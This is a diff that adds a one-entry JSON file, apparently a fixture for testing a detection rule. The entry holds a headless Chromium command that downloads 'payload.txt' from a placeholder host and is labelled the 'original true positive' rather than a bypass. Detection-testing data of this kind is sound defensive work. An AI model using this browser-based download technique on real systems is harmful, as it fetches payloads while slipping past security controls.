@@ -1,0 +1,6 @@
+[
+  {
+    "output": "chromium.exe --headless --dump-dom http://example.com/payload.txt",
+    "explanation": "This is the original true positive command and is not a bypass. It is included for reference."
+  }
+]
